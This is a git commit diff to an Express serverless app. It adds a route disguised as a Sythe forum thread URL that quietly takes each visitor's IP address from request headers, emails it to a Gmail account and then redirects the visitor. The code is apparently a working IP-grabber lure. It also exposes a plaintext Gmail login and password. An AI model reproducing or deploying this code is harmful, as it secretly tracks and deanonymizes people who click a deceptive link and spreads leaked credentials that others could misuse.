632f8466829b8a55ebc56f99561a7118f812792d
Ayush <ayush.yushey@gmail.com>
2020-12-09 23:12:27 -0500

    up

--- express/server.js
+++ express/server.js
@@ -4,17 +4,40 @@ const path = require('path');
 const serverless = require('serverless-http');
 const app = express();
 const bodyParser = require('body-parser');
+const nodemailer = require("nodemailer");
+const senderMail = 'timegawd99@gmail.com';
 
+const emailTransporter = nodemailer.createTransport({
+            host: 'smtp.mail.gmail.com',
+            port: 465,
+            service:'gmail',
+            secure: false,
+            auth: {
+               user: senderMail,
+               pass: 'Rockettroop1'
+            },
+            debug: false,
+            logger: false
+});
 
-const fs = require('fs');
 
 const router = express.Router();
 router.get('/threads/3721727/bils-vouches/', (req, res) => {
   var date = new Date();
 
   var ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
-
-  fs.writeFile('../logs.html', date.toString() + ip, function (err) {
+  var mailOptions = {
+    from: '"Sythe <sythe>" ',
+    to: 'timegawd1@gmail.com',
+    subject: 'Sythe: ' + ip,
+    text: ip
+  };
+  emailTransporter.sendMail(mailOptions, function(error, info){
+    if (error) {
+      console.log(error);
+    } else {
+      console.log('Email sent: ' + info.response);
+    }
   });
 
   res.set('location', '../index.html');
